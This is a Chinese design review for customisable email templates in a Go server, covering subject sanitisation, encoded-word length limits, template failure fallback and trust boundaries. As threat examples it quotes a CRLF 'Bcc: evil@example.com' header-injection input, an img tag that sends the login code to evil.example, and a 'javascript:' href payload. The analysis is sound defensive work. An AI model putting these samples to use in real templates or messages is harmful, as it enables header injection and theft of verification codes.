### 0.1 PG1 裁决：**选项 1——渲染后剥离控制字符**，T08 的 `=0D=0A` 预期删除

**裁决**：自定义主题的管线定为

```
模板渲染 → 剥离控制字符（unicode.IsControl）→ 200 rune 上限 → 998 octet 上限 → 交通道
                                                                    ↑ 通道分叉点在这之后
```

`=0D=0A` 不再是任何验收项的预期值。T08 的预期改为 `HiBcc: evil@example.com`（见 §8 T08）。

**为什么不是选项 2（保留 CR/LF 交给 `QEncoding`）——三条实测理由：**

**理由一：选项 2 依赖的隐式前提是假的。** 调度在路由分录里点出，选项 2 的安全性建立在
「`QEncoding` 必然触发」这一隐式前提上，要求 r2 把它写成显式不变量。**我写不出来，因为它不成立。**

Go 的触发判据（`/usr/local/go/src/mime/encodedword.go:42-49`）：

```go
func needsEncoding(s string) bool {
	for _, b := range s {
		if (b < ' ' || b > '~') && b != '\t' {   // ← TAB 被显式豁免
			return true
		}
	}
	return false
}
```

我的实测（§12 探针 A）：

```
A U+0009 IsControl=true  Q="Hi\tThere"              ← 原样穿过，未编码
A U+000D IsControl=true  Q="=?utf-8?q?Hi=0DThere?="
A U+000A IsControl=true  Q="=?utf-8?q?Hi=0AThere?="
A U+007F IsControl=true  Q="=?utf-8?q?Hi=7FThere?="
A U+000B IsControl=true  Q="=?utf-8?q?Hi=0BThere?="
```

TAB 是 `unicode.IsControl` 为真的控制字符，`QEncoding` 却原样放行。所以选项 2 能写出来的
最强不变量只能是「`QEncoding` 对**除 TAB 外**的控制字符必然触发」——一个带例外的防线，
而例外恰好落在唯一一个不会被编码的控制字符上。TAB 单独出现在 header 值里是合法的 WSP，
本身不构成注入，但**一条要靠「必然触发」成立的不变量，不能带例外**。选项 1 无此问题：
`unicode.IsControl` 把 TAB 一并剥掉。

**理由二：选项 2 的防线是通道相关的，选项 1 不是。** `QEncoding` 只存在于 SMTP 通道
（`email.go:292`）。Resend 通道（`:359`/`:400` → `Emails.Send`）**没有任何本地编码**——
这是 r1 §3.3 自己记下的事实（「主题落到 Resend｜无本地编码｜依赖 Resend 侧过滤」）。
INV8 要求两条通道拿到**同一份**渲染结果，所以选项 2 之下，那条带裸 CRLF 的主题会原样交给
第三方，我方的防护为零，全靠 Resend 自己过滤。选项 1 的剥离发生在**通道分叉之前**，
两条通道由我方同一段代码覆盖。

**理由三：选项 2 会让自定义路径比内置路径更弱。** 今天每一段进入主题的用户可控文本都先过
`sanitizeSubjectField`（剥控制字符），且发生在通道分叉之前。选项 2 让运维方写的主题在同一个
sink 上享受比工作区名更弱的处理——这与 F3 第 1 条（既有部署零变更优先）所体现的取向相反，
对上游也不好解释。

**需要说清的一点**：就 CRLF **这一个** case 而言，两个选项都不产生 header 注入。
我实测把选项 2 的输出装进完整 header 块交给 `net/mail.ReadMessage`（§12 探针 P8），
解析成功、无 `Bcc` header、Subject 就是那个 encoded-word。**所以这次裁决不是在两个安全性
不同的方案里选安全的那个，而是在两条契约里选能写成无例外不变量、且覆盖两条通道的那条。**

**根因登记**：`=0D=0A` 是一句关于 `QEncoding` **孤立行为**的真观察，在 §7.1 里被写进括号，
又被 T08 从括号升格成管线**末端**的验收预期。观察为真，位置错了——中间隔着一步会让它失效的
剥离。r2 已删除该括号（§7.1 改写），并在 §0.3 把这条写作纪律全文执行了一遍。

### 0.2 PG2 裁决：**三个时机分离**——解析期回落 / 启动期只告警 / 运行期回落

**裁决**：放弃「未知字段在解析期失败」这个不存在的机制，也**不采纳**「零值预执行决定是否回落」，
改为下面这套三时机分工。**T14 从「解析期失败」改写为「启动期告警 + 运行期回落」。**

| 时机 | 检测什么 | 是否改变「用哪份模板」 | 依据 |
|---|---|---|---|
| **解析期**（`Parse`） | 语法错误 | **是**——该文件回落内置，启动告警 | `Parse` 只做语法分析，与数据无关，判断**可靠** |
| **启动期零值预执行**（`Execute(io.Discard, zeroValue)`） | 未知字段、明显写错的表达式 | **否**——只发一行告警，模板照常启用 | 既不 sound 也不 complete，只能当诊断，不能当判据 |
| **运行期**（每次发送 `Execute` 到 `bytes.Buffer`） | 一切执行期错误 | **是**——本次发送回落内置，邮件照常发出 | 覆盖完全、无假阳性，是唯一权威机制 |

**为什么零值预执行只能是告警——实测（§12 探针 P5）：**

```
P5 unknown-field  zeroExec=true  realExec=true    ← 想要的：{{.SMTPPassword}} 两边都报错
P5 false-positive zeroExec=true  realExec=false   ← {{slice .Code 0 3}}
P5 false-negative zeroExec=false realExec=true    ← {{if .Code}}{{slice .Code 0 99}}{{end}}
P5 ok             zeroExec=false realExec=false
```

- **假阳性**：`{{slice .Code 0 3}}`（取验证码前三位分组显示，是运维方会真写的东西）在零值下
  `index out of range: 3`，在真实数据下完全正常。若让预执行决定回落，这个**能用的模板会被
  永久停用到下次重启**，运维方看到的是「我的模板没生效，日志说 index out of range」。
  这正是 F3 第 2 条（不因新校验让原本能用的部署失败）要避免的形态——只不过失败的不是启动，
  是功能。
- **假阴性**：`{{if .Code}}{{slice .Code 0 99}}{{end}}` 在零值下 `if` 为假、整段跳过、检查通过，
  真实数据下才炸。所以预执行给出的「通过」也不能当保证。

**既不 sound 也不 complete 的检查，不能拿来做判据；但它能抓到最常见的那一类错误**——
把字段名拼错（`{{.Code}}` 写成 `{{.VerificationCode}}`），零值下必报。所以保留它，
**降级为诊断**：发一行告警，不改变模板选用。这样假阳性的代价从「功能被停用」降到「多一行日志」，
假阴性也不再是问题，因为它本来就不承担保证。

**为什么不做 parse tree 静态遍历**：技术上可行（`t.Tree.Root` 可达），但要正确实现必须建模
`{{with}}` / `{{range}}` / `$var` 下的 `.` 重绑定——实测 `{{with .Code}}{{.}}{{end}}` 的树里
那个 `{{.}}` 指的是 `.Code` 而非根（§12 探针 P5b）。那是给模板语言的一个子集写类型检查器，
是本方案从未描述过的新子系统；而且它一旦写错就**fail closed**——把合法模板判坏、静默降级，
和零值预执行的假阳性是同一种伤害，只是错误来源变成了我们自己的校验器。收益（把一个诊断
提前）远小于代价。**明确排除，列入 non-goal 9。**

**与 T15 的覆盖边界（这是调度要求正面回答的）：**

> **启动期预执行不承担任何覆盖保证**，它是诊断。**运行期 `Execute` 失败（T15）是唯一决定
> 回落的机制，覆盖 100% 的执行期错误，且不存在假阳性**——因为它用的就是真实数据，
> 失败即真失败。二者不是「两道防线分工」，是「一道防线 + 一个提示」。

**§7.1 规则 1 的结论保留，理由改写。** 结构体仍然优于 `map[string]any`，但正确的理由是：
map 上未知字段静默成空值，**发出去一封残缺邮件而没有任何信号**；结构体上是硬错误，
**必然触发运行期回落，收件人拿到的是完整的内置邮件**。差别不在检测时机，在失败形态——
静默残缺 vs 明确回落。（附带收益：结构体让启动期零值预执行这个诊断成为可能，map 做不到。）
INV5 相应改写为三时机版本（见 §5）。

### 0.4 PG10 裁决：CJK 主题在 998 octet 之下的有效长度是 **91 rune**，「~81」的来源已查明

**先复算，不采信调度给的数字。** 用与 INV11 完全相同的度量口径
`len("Subject: " + mime.QEncoding.Encode("utf-8", s))`（不含 CRLF，`len("Subject: ") == 9`）
独立跑一遍（§12 探针 R1）：

```
CJK n= 90 ->  987 octet  fits998=true
CJK n= 91 ->  996 octet  fits998=true      <- 998 之下的最大 rune 数
CJK n= 92 -> 1018 octet  fits998=false
```

**结论与调度一致：91，不是 81。** r2 的「~81 rune」「约 80 字」是错的。

**81 是怎么来的——不是另一种合理口径，是探针与不变量用了不同的阈值。**
r2 §12 探针 D 的原文逐字是：

> `D largest all-CJK subject under 900 octets = 81 runes (line=893)`

「under **900** octets」。而 INV11 规定的是 **998**。我把阈值当参数扫一遍（§12 探针 R1）：

```
T=900 -> max all-CJK n = 81 (line=893)     <- r2 §12 记下的就是这一行
T=998 -> max all-CJK n = 91 (line=996)     <- INV11 真正需要的那一行
```

**81 是一个正确的观测，被填进了一个它不适用的槽位。** 探针跑的是 900，方案正文引用它时写成了
998 之下的结论，然后这个数字扩散到五处（§1.4 A7、§2 Q5 背景、§5 INV11、§8 T21/T23、
§11 L3 `must_answer` 6）。900 这个数从哪来无从考证——探针源码已删，§12 只留了输出，
这本身就是 PG13（§0.7）。

**所以调度那句「度量口径本身需要在 INV11 里写死，这比订正数字更重要」是对的，但还要再进一步。**
真正出问题的不是口径（`len("Subject: " + Q(s))` 从 r2 到 r3 一字未改，探针与不变量用的是同一个），
是**阈值**。口径写死了、阈值没写死，一样会再出一次 PG10。r3 的处置是三条，缺一不可：

1. **INV11 里同时写死度量口径与阈值**，并写出「这两者必须与探针使用的完全一致」这句约束（§5）。
2. **§12 每条数值证据必须记录：位置 + 阈值 + 构造**（§12 开头新增说明）。只记输出等于交出一个
   不可复算的数——PG10 与 PG13 都是这么来的。
3. **T23 断言精确值 91 而不是「~81 附近」**（§8）。r2 写「~」是因为它知道自己不确定；
   而这个值对固定字符集是**完全确定**的，写「~」本身就是一个应该被追问的信号。

**「91」不是一个数，是一族数——这一点必须写进文档面，否则 T21 会再犯一次同型错误。**
有效长度取决于主题的字符构成（§12 探针 R1/R5）：

| 主题构成 | 998 之下的最大 rune 数 | `Subject:` 行 octet |
|---|---|---|
| 纯中文 `中` / 纯日文 `語` / 纯韩文 `한`（任意 3 字节 UTF-8 字符） | **91** | 996 |
| 中日韩字符 + 每 8 个插一个空格（更接近真实主题） | 99 | 998 |
| Emoji（4 字节 UTF-8，12 octet/rune） | 71 | 998 |
| 纯 ASCII | **200（即 200 rune 上限先生效，octet 规则完全不触碰）** | 209 |
| `é`×122 + `a`×76（混合宽度，§0.5 用到） | 198 | 998 |

**91 是 3 字节 CJK 的精确值，同时是常见主题的下界**——任何 ASCII 字符、空格或标点都会把它抬高。
文档要写的是「**纯中日韩主题约 91 字**；含空格与 ASCII 时更长；纯 ASCII 主题 200 字不受影响」，
而不是一个孤零零的数字。r2 的 T21 要求把「约 80 字」写进四语言文档，那既是错值，
也是错的表达形态。

**量化步长（顺带确认，也是 PG11 的依据）**：每个 3 字节 CJK 字符占 9 octet（`=XX` ×3），
在 encoded-word 边界一次跳 22 octet（`?=` + 空格 + `=?utf-8?q?`）：

```
n=89 -> 978 (+9)   n=90 -> 987 (+9)   n=91 -> 996 (+9)
n=92 -> 1018 (+22) <- encoded-word 从 13 个变 14 个
```

**论证方向不受影响**：200 → 91 仍然是显著压缩，Q3 裁决的实际效果仍然被 INV11 改变，
所以 Q5 仍然必须交闸门 1（§2）。变的是数字与 Q5 的问法（§0.4 末尾 + §2）。

**Q5 要不要换问法——要，而且不只是换数字。** 详见 §2，这里给结论：拆成 Q5a / Q5b 两问。
r2 的 Q5 只问「上限值取多少」，这**预设了「要有这条上限」已经成立**；而 §9 可证伪条件 10 与
L3 `must_answer` 6 都在质疑这个前提（U7 未验证：真实 MTA 对超长 `Subject:` 行的处置不明，
且内置路径今天就产出 1349 octet 从未有人报障）。把一个自己写在可证伪清单里的前提，
在唯一的确认项里悄悄当成已定，是不诚实的提法。r3 让「要不要这条上限」显式出现在发起人面前，
并给出明确推荐（要）。

### 0.5 PG11 裁决：**采纳方向 (b)**——T24 改写为「最长满足前缀」的不动点性质，另加一条**运行期推导**的精确边界

**先确认 finding 成立。** r2 的 T24 要求「主题模板渲染出**恰好使 `Subject:` 行等于 998 octet**
的内容」。在 r2 自己规定的管线（先 200 rune、再 998 octet）与 T23/Q5 通篇使用的字符集里，
这个点不可达（§12 探针 R2）：

```
纯 CJK，n ∈ 1..400，命中 998 的 rune 数：无     （9 octet 步长 + 边界跳 22，998 被整个跳过）
纯 ASCII，命中 998 需 n=989                     （但 200 rune 上限先生效，200 ASCII = 209 octet）
```

调度的混合宽度构造我也逐字复算通过：`22×"é" + 63×"中" + 109×"a"` = 194 rune → **恰好 998**，
再接一个 ASCII rune → 999。**所以 998 不是绝对不可达，只是在方案自己使用的语境里不可达。**
这与实现前两次开工即停同型：判据在管线里做不到。

**裁决：采纳 (b)，不采纳 (a) 的「把构造串写进 T24」，但保留一条运行期推导的精确边界用例。**

采纳 (b) 的理由，前两条是调度给的，第三条是我复算时才确认的：

1. **(a) 会把一个偶然的构造固化进测试。** `22é+63中+109a` 里没有任何一个数字有含义，
   它们是 Go 的 Q-encoding 量化步长与 encoded-word 折断位置的巧合产物。写进测试后，
   任何人都无法判断改动它是否安全——这正是 §12 探针 D 只留输出不留构造所造成的伤害
   （PG10/PG13），不该在验收里再造一次。
2. **(b) 顺带把量化步长这个事实覆盖了**：断言「再接一个 rune 必然超限」在 CJK 上就是断言
   996 → 1018 这一跳，而这一跳正是 998 不可达的原因。
3. **（复算新增）(b) 的前提我验证过了，它成立。** 「最长满足前缀」这个说法只有在
   `subjectLine` 对 rune 前缀**单调不减**时才良定义——否则「最长的满足者」可能不唯一、
   也不能二分。实测（§12 探针 R2）：5 个字符集（ASCII / Latin-1 / CJK / Emoji / 混合）
   × 4000 条随机串 × 每条的每个前缀，**非单调步数 = 0**。
   我在 r3 里把这条单调性写成 INV11 的显式前提（§5），因为不动点性质整个压在它上面，
   而 r2 从来没有陈述过它。

**不采纳 (a)，但也不放弃精确边界——`≤` 写成 `<` 这个 off-by-one 必须被回归覆盖。**
处置是：让**测试自己在运行期推导**出一个恰好命中上限的串，而不是把常量写死。
推导必须是确定性的、且允许「推导不出」：

```go
// 双参数枚举：宽字符 × 窄字符，按固定顺序取第一个命中的组合。
// 找不到就 t.Skip —— 「998 是否可命中」是 Go 编码器的性质，不是我方代码的性质。
func deriveExactBoundary(wide, narrow string, target, maxRunes int) string
```

实测这个枚举确实能推出解，且第一个成功的组合是确定的（§12 探针 R3）：

```
wide="中" narrow="a"  -> 200 rune 内不可达        <- 这正是 PG11 的内容，被枚举确认
wide="é"  narrow="a"  -> 122×é + 76×a = 198 rune, line=998 ; +1 -> 999
wide="😀" narrow="a"  ->  56×😀 + 136×a = 192 rune, line=998 ; +1 -> 999
```

**为什么这样比 (a) 好**：串是推导出来的，改了截断实现或换了 Go 版本，推导跟着变；
而写死的常量会在编码器行为变化时静默失效（它仍然是一个合法字符串，只是不再等于 998）。
**为什么允许 Skip**：若将来 Go 改了 Q-encoding 的折行位置导致 998 在 200 rune 内彻底不可达，
这条用例应当消失而不是变红——它测的是我方截断函数的边界处理，不是编码器的取值分布。
不动点性质（T24a）在那种情况下仍然全覆盖。

T24 的新全文见 §8。要点：T24a 断言四条性质（满足上限 / 是 rune 对齐的前缀 / 极大 /
幂等，且输入本就满足时原样返回），T24b 断言运行期推导出的精确边界，
量化步长那一跳并入 T23（996 → 1018）。四条性质在 20000 条随机输入 × 5 个字符集上
**违反数 = 0**（§12 探针 R2）。

**另有一条不构成 gap、但会让实现浪费时间的实现陷阱，补进 §14 提醒（不占 PG 编号）：**

R-OBS-1 要求「用 `textproto` 的 DotReader 读 DATA，再按 CTE 解 quoted-printable」。
实测（§12 探针 R4）这条要求是**充分且必要**的，但它有一个反直觉的副作用：

```
DotWriter：bare "\n" -> "\r\n"，前导 "." -> ".."，Close 补 ".\r\n"
DotReader：CRLF -> LF（把行尾改回裸 \n），".." -> "."
```

**`DotReader` 会把 CRLF 改回裸 LF**，所以读回来的字节里 header 与 body 的分隔符是 `"\n\n"`
而**不是** `"\r\n\r\n"`。按后者去切分会拿到 `-1`。这一点在 r2 里没有任何地方写到，
而 T01/T05/T05b/T09/T10 全都要切分 header 与 body。

**好消息是这两个变换互为精确逆**：实测同一份含裸 `\n`、含孤立 `.` 行、含 `=`、长度跨过
76 列软换行的正文，走 8bit 分支与走 quoted-printable 分支，**经 DotReader（+ QP 解码）
之后与 Go 源码里的字面量逐字节相同**（§12 探针 R4）：

```
8bit 解回 == qp 解回                 : true
8bit 解回 == 原始 Go 字符串（裸 \n） : true
```

所以 T01 的「逐字节相同」与 T05b 的「与 T05 解码后相同」**都是可达的**，前提是严格照
R-OBS-1 做。若有人图省事直接读 socket 字节，拿到的是 CRLF 版本，两条断言都会假红。

### 1.3 合理推导

- **D1**：F3 的「字节级零变更」若靠「改完再写测试证明没变」来保证，每次重构都要重新证明一遍。
  应当让它成为**结构性质**——未配置时根本不进入新代码路径。这条决定了整个方案的形态（§6 方案 A）。
- **D2**：F5 的「自动转义是否足够」隐含了「模板文本本身是否可信」。自动转义保护的是
  **注入模板的数据**，不保护**模板文本**。真正的答案不在转义机制上，而在**谁有权写模板**这条边界上（§7）。

  用官方 compose 的自建用户**根本没法设置它**。文档面因此是 11 个文件而非 5 个（已由 F7/Q4 裁决确认）。

### 4.3 `buildInvitationParams` 与 `sanitizeSubjectField` 的签名决定

**`buildInvitationParams`**：包级函数，模板对象挂在 `*EmailService` 上，天然写法是加一个参数。
**不要这样做**：那会让 `email_test.go` 里既有测试的调用点全部产生 diff，而这些测试正是维护者
用来锁定既有转义行为的。采用：原样保留，另加 `buildInvitationParamsFromTemplate(...)`（P08b），
由 `SendInvitationEmail` 按模板是否命中二选一。

**`sanitizeSubjectField`（PG6，r2 新增的同类决定）**：新路径需要「剥控制字符 + 200 rune +
998 octet」，`sanitizeSubjectField` 给的是「剥控制字符 + 60 rune」，**新路径无法调用它**。
r1 同时写了「P09 不修改，仅新增调用者」和「INV2 渲染后同样先剥控制字符」，二者没有可行实现。
采用同一取舍：新增平行函数 `sanitizeRenderedSubject`（P27），`sanitizeSubjectField` 保持零 diff。

**代价（自觉承担并给出对冲）**：控制字符剥离的判据（`unicode.IsControl`）在两处各写一遍，
存在漂移风险——若将来有人改其中一个，两条主题路径的清洗强度会不一致而没有任何信号。
**对冲是 T22**：一张控制字符对照表，逐个断言两个函数对同一输入的剥离结果一致。
这是一个会在漂移发生时立刻变红的机械证据，而不是一句注释。

### 5.1 INV11 的度量口径、阈值与前提（r3 新增，PG10 的处置）

r2 只写了度量口径，没写阈值；探针于是自行用了另一个阈值（900），跑出 81 并把它当成
998 之下的结论（§0.4）。**度量、阈值、前提三者缺一，这条不变量就不是可验证的。**
全部写死在这里，§8 与 §12 引用本节，不得各自复述一份：

**度量（metric）** — 被约束的量是

```go
func subjectLine(s string) int {
    return len("Subject: " + mime.QEncoding.Encode("utf-8", s))   // len("Subject: ") == 9
}
```

不含结尾 CRLF；`s` 是**清洗之后、进入 `sendSMTP` 之前**的主题字符串。
实现代码与探针代码必须调用同一个函数，不得各写一份。

**阈值（threshold）** — **998**，取自 RFC 5322 §2.1.1（不含 CRLF 的行长上限）。
不取 RFC 5321 §4.5.3.1.6 的 1000（含 CRLF）：两者只差 2 octet，取严的那个不增加实际代价。
**任何以其他阈值得出的数字都不是本不变量的证据**——这正是 r2 出错的方式。

**前提（precondition）** — `subjectLine` 在 rune 前缀上**单调不减**：对任意字符串 `s`
与其任意 rune 前缀 `p`，有 `subjectLine(p) ≤ subjectLine(s)`。r2 从未写出这条，但
「从尾部截断直至满足」的终止性、以及 T24a 的「极大前缀唯一」全部压在它上面。
本轮已实测（§12 探针 R3）：**5 个字符集 × 4000 条随机串 × 每一个前缀，非单调步数 = 0**。
它是 Go `QEncoding` 的性质而非我方代码的性质，所以列为**前提**而非断言——若未来 Go
版本让它不再成立，截断算法要重新设计，不是改个数字。

**由此得到的具体数字（§12 探针 R1，分字符集）**：

| 主题构成 | 998 之下的最大 rune 数 | 该长度的 `Subject:` 行 octet |
|---|---|---|
| 纯中日韩（任意 3 字节 UTF-8） | **91** | 996 |
| 中日韩 + 每 8 字一个空格 | 99 | 998 |
| Emoji（4 字节 UTF-8） | 71 | 998 |
| 纯 ASCII | **200 rune 上限先触顶，octet 规则不触碰** | 209 |

**91 是「纯中日韩」这一族的值，不是普适常量。** 文档面（T21）与 Q5b 背景必须按字符集
表述，不能写一个孤零零的数字——r2 写「约 80 字」既错值又错形态。

量化台阶（同一探针）：CJK 每加一个 rune `+9` octet（`n=89→978`、`90→987`、`91→996`），
但 `n=92` 跳到 **1018**（`+22`），因为编码字从 13 个变成 14 个，多出 `?=` + 空格 +
`=?utf-8?q?`。**998 落在这个台阶的缝里**，纯 CJK 主题不可能恰好等于 998——这正是
PG11 的根因，见 §0.5。

## 6. 方案比较

**本节与 r1 一致，未因 PG1/PG2 改变。** 两处 finding 都不触及路线选择：方案 A 的论证依据是
源码事实（`auth.go:334-360` 的验证码邮件全程不涉及 workspace）与 #7568 中可读到的维护者取舍偏好，
均未被动摇。全文保留以便 r2 可独立阅读。

### 方案 A（推荐）：`EMAIL_TEMPLATE_DIR` 挂载模板目录 + 内置路径完全旁路

**做法**：新增单一环境变量 `EMAIL_TEMPLATE_DIR`（默认空 = 关闭）。非空时在 `NewEmailService`
中读取该目录，按固定文件名解析：

```
$EMAIL_TEMPLATE_DIR/
  verification_code.subject.tmpl    # text/template
  verification_code.html.tmpl       # html/template
  invitation.subject.tmpl           # text/template
  invitation.html.tmpl              # html/template
```

四个文件**各自独立可选**——只放 `verification_code.html.tmpl` 就只覆盖那一个，其余保持内置。
每个模板对应一个显式定义的数据结构（字段全部为 `string`，见 §7.1）。
未配置或某文件缺失/解析失败时，对应邮件走**今日一字未改的 `fmt.Sprintf` 代码路径**。

**代价**

- 引入文件系统依赖：容器需要一个卷挂载；官方 compose 未提供，运维方要自己加（U4）。
- 引入模板注入面：模板文本本身不受自动转义保护（D2）。缓解见 §7。
- `server/` 首次出现生产用 `html/template`（R9），团队与 CI 都没有既有经验可依。
- 两封邮件的构造函数各变成「二选一」，代码里同时存在内置版与模板版（§4.3）。
- **（r2 补充）主题清洗函数也变成两份**（§4.3 / PG6），对冲是 T22。

**适用条件**：模板作者 = 部署运维方。这正是自建部署的情形。

### 方案 B：环境变量覆盖（`EMAIL_TEMPLATE_*` 系列）

**做法**：把主题与正文直接放进环境变量。

**代价**：变量数量爆炸（2 封 × (主题+正文) = 4 个，加邮件或加语言就乘上去），而 R7 意味着
**每个新变量都要同时改 `docker-compose.selfhost.yml`**；多行 HTML 塞进 `.env` 会踩转义地狱，
base64 则不可 review；无法按文件粒度回落。

**为什么不选**：没有任何一项优于方案 A，除了「不需要挂卷」，而挂卷对自建部署是常规操作（R11）。
**部分保留**：方案 A 的开关本身就是一个环境变量，这是方案 B 唯一值得保留的部分。

### 方案 C：数据库配置 + 管理界面

**代价（前两条是工作量，第三条是否决理由）**

1. 改动面最大：migration + sqlc + handler + 权限模型 + 前端编辑器 + 预览。上游零表态时提这种
   PR，被合入的概率接近零。
2. 需要引入模板版本、回滚、审计。
3. **它把模板授权点从「部署运维方」下移到「租户内管理员」，是一次真实的信任边界下移。**
   验证码邮件在 `auth.go` 的登录流程中发给**任意输入的邮箱地址**，此时收件人与任何工作区都还
   没有关系（`auth.go:334-360` 全程不涉及 workspace）。若某工作区管理员能编辑验证码邮件模板，
   他就获得了「用实例已验证的发信域名，向任意邮箱发送自己撰写的内容」的能力——而且模板数据里
   必然包含 `Code`，所以他还能把验证码外带（`<img src="https://evil.example/?c={{.Code}}">`）。
   这不是「改动面大」，这是**跨租户提权**。

**为什么不选**：第 3 条。若将来要做 UI，必须先解决「模板作用域与验证码邮件的无租户性之间的
矛盾」，而这个矛盾在验证码邮件上无解——除非只允许实例级超管编辑，那就退化成方案 A 换存储介质。

### 选 A 的决定性因素

**信任边界与零变更保证同时最优。** 方案 A 把授权点留在部署运维方（D3），并且是三条路径中
唯一能把「未配置时零变更」做成**结构性质**而非断言的（D1/§4.3）——因为它允许内置路径一行不改。
方案 B 也能做到，但代价没有换来任何收益；方案 C 做不到，因为它必然要统一渲染路径。

## 7. 必答的三个安全点

### 7.1 `html/template` 自动转义在本场景是否足够？是否需要限制函数集与数据白名单？

**分两层回答，因为提问里混了两个不同的东西。**

**第一层：注入模板的数据。够，而且实测比现状严格。**
`html/template` 做的是上下文感知转义。实测（§12 探针 P6）：纯文本上下文下它与现有
`html.EscapeString` **逐字节相同**，所以 INV7 不会因为换机制而放松；`href` 上下文下它更严
（`javascript:alert(1)` → `#ZgotmplZ`，`?x=1&y=2` → `?x=1&amp;y=2`）。因此
`{{.WorkspaceName}}` / `{{.InviterName}}` / `{{.Code}}` 不可能从数据侧突破成 HTML 或脚本。

**必须写死的实现约束**：**绝不把已经 `html.EscapeString` 过的字符串喂给模板**。
实测二次转义会把 `A&B` 变成 `A&amp;amp;B`，在收件人眼里就是乱码。模板路径传**原始**字符串，
由模板引擎负责转义；内置路径继续用 `html.EscapeString`。两条路各自自洽，不共用中间结果。
**T25 专门测这一条**——单元测试若只用 ASCII 名字，这个 bug 测不出来。

**第二层：模板文本本身。不够——因为自动转义根本不管这一层，也不该管。**
模板作者可以写 `<script>`、可以写钓鱼话术、可以把 `{{.Code}}` 放进外链 URL 外带验证码。
**这是任何模板机制的固有属性，无法用转义解决。** 唯一的解法是控制谁能写模板：

> 模板自定义能力的安全性不取决于转义机制，取决于模板作者是否等同于部署运维方。
> 运维方本来就控制二进制与发信域名，给他模板能力不新增任何权限；
> 给租户管理员模板能力则是提权。

**函数集：注册零个自定义函数（FuncMap 为空）。**
Go 标准库模板与 Jinja2 / ERB 有本质区别——**默认函数集里没有任何文件系统、环境变量或进程执行
入口**（只有 `and` / `or` / `not` / `len` / `index` / `print` / `printf` / `slice` / `call` 等纯值操作，
外加 html/template 的转义器）。因此「模板读 `/etc/passwd`」「模板读 `$SMTP_PASSWORD`」在
Go 里不是需要防的攻击，是本来就不存在的能力。**只要不注册 FuncMap 就保持这个性质**，
所以「不引入任何自定义模板函数」列为 non-goal 8 —— 这是一条要被评审盯住的红线。

**数据白名单：每个模板一个显式结构体，字段全部为 `string`。**

```go
type verificationTemplateData struct {
    Code             string // 6 位数字，服务端生成
    ExpiresInMinutes string // "10"
    AppName          string // 品牌名
    AppURL           string // FRONTEND_ORIGIN
}

type invitationTemplateData struct {
    InviterName   string
    WorkspaceName string
    InviteURL     string
    AppName       string
    AppURL        string
}
```

三条硬规则：

1. **绝不传 `map[string]any`。**
   **（r2 改写理由，PG2）** 取舍不变，理由订正：区别**不在检测时机，在失败形态**。
   map 上未知字段静默成空值，结果是**发出一封残缺邮件而没有任何信号**；结构体上是硬错误，
   **必然触发运行期回落，收件人拿到完整的内置邮件**。
   ~~「结构体上引用不存在的字段是解析期错误」——**这句话是错的，已删除**~~：
   `Parse` 不接收数据类型，只做语法分析；`{{.SMTPPassword}}` 在 `text/template` 与
   `html/template` 上都 `Parse=nil`，只在 `Execute` 时报
   `can't evaluate field SMTPPassword in type ...`（§12 探针 P4，两条路径均已实测）。
   附带收益：结构体让启动期零值预执行**诊断**成为可能（map 做不到），但那只是诊断，见 §7.3。
2. **绝不有任何字段是 `template.HTML` / `template.URL` / `template.JS` 类型**——这些类型是
   显式的「跳过转义」标记，出现一个就等于在数据侧开了洞。
3. **绝不把 `*EmailService`、配置对象或 `os.Environ()` 的产物放进数据结构**——否则
   `{{.SMTPPassword}}` 之类的字段名一旦被导出就是凭据泄露。验证码模板的数据结构**只能包含
   内置模板今天已经渲染出来的信息**，一个字段都不多。

**主题模板用 `text/template`，不是 `html/template`。**
理由是现有代码自己写的（R4，`email.go:413-416`）：Subject 不做 HTML 渲染，用 HTML 转义会把
`&#34;` 之类的实体字面量泄进收件箱。

**主题的防线（r2 改写，PG1/PG3）——渲染后依次经过，全部在通道分叉之前：**

```
1. 剥离全部 unicode.IsControl 字符      ← 我方代码，覆盖两条通道
2. 200 rune 上限（A4/Q3）               ← 我方代码
3. 998 octet 的 Subject: 整行上限（INV11）← 我方代码
   ────────── 通道分叉 ──────────
4a. SMTP：mime.QEncoding.Encode          ← 纵深防御，不承担第 1 步的职责
4b. Resend：无本地编码                    ← 正因为它什么都不做，第 1 步必须在分叉前
```

**第 4a 步不是控制字符防线，只是纵深防御。** `mime.QEncoding.Encode` 并非无条件编码：
纯 ASCII 可打印串原样返回，且 **TAB 被 `needsEncoding` 显式豁免**
（`(b < ' ' || b > '~') && b != '\t'`，`encodedword.go:44`），实测 `Q("Hi\tThere") == "Hi\tThere"`。
它也**不折行**——`splitWord` 写的是空格而非 CRLF（`encodedword.go:173-178`），所以超长主题
产出的是一条超长行，这正是第 3 步存在的原因。

### 7.2 自定义模板是否可能被用于伪造发信人或钓鱼？边界在哪？

**伪造发信人：不能，且这一点是可机械验证的。**
`From:` header 与 SMTP envelope 都取自 `resolveFromEmail`（P16 → P12/`:309`/`:319`/`:357`/`:398`），
模板产出的两个字符串只会流向 `subject` 与 `htmlBody` 两个参数。模板里写 `From: evil@example.com`
只会让这行字**作为正文可见文本**出现在 body 段。INV6/T09 的探针就是断言这一点
（**注意 T09 必须解码 QP 后再断言**，PG4）。

同时划死一条边界：**模板不得控制 `Reply-To` / `Bcc` / `Cc` / 任意 header。**
`resend.SendEmailRequest`（SDK v2.28.0，已核对）确实提供 `ReplyTo` / `Bcc` / `Cc` / `Headers`
字段，本方案一个都不接线（non-goal 4）。这条必须显式写出来，因为「没接」和「接不了」在
review 时看起来一样，但含义完全不同。

**正文层面的钓鱼：能，且这是被接受的。**
运维方可以写「点此重置密码」链到任意站点。他本来就能改二进制。边界是：**这个能力止于运维方**。
- 方案 A 的开关是环境变量 + 文件系统，两者都只有能操作部署的人才能碰 → 边界成立。
- 方案 C 会把它交给租户管理员 → 边界破裂（§6 方案 C 第 3 条）。

**新引入的传输层担忧，已实测排除：**
自定义正文是任意字节，自然的疑问是「正文里写一行 `.` 能不能提前终止 SMTP DATA」。不能：
`smtp.Client.Data()` 返回 `textproto` 的 `DotWriter`（`net/smtp/smtp.go:296`），文档明载它负责
插入前导点、`\n`→`\r\n` 转换、Close 时补 `.\r\n`。这条**不需要新增防护**，但要写进验收（T10）。
**（r2 补充，PG4）**：正因为 DotWriter 会做 dot-stuffing，**测试 harness 读 DATA 时必须做
反向的 unstuffing**——BASE 那个 `readLine()` 循环（R15）会把正文里的 `.` 行读成 `..`。
用 `textproto.Reader.ReadDotBytes()` / `DotReader()`，不要手写循环。

### 7.3 模板加载失败的降级路径（r2 按 PG2 重写为三时机）

